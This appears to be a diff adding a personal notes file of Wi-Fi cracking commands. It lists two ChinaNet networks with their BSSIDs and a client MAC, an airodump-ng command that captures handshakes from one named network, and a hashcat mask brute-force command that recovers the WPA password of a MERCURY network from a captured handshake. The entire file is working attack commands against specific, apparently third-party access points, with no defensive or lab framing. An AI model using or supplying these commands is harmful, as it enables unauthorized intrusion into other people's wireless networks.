@@ -1,0 +1,9 @@
+ChinaNet-6uG9Cu 04:20:84:0D:18:29 4 24:69:8E:4C:7F:E0
+ChinaNet-kx72 10:10:81:18:62:48
+
+
+
+airodump-ng -w ChinaNet-6uG9Cu -c 4 --bssid 04:20:84:0D:18:29 wlan0mon
+
+
+.\hashcat.exe -a 3 -m 22000 "C:\Users\Goojoe\OneDrive - goojoe\200-Study\240-Code\Python\wifi-path\hc22000\MERCURY_ADF0-BC-5F-F6-BC-AD-F0.hc22000" -o "C:\Users\Goojoe\OneDrive - goojoe\200-Study\240-Code\Python\wifi-path\passwd.txt" --increment --increment-min 8 --increment-max 11 --custom-charset1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1 --session MERCURY_ADF0
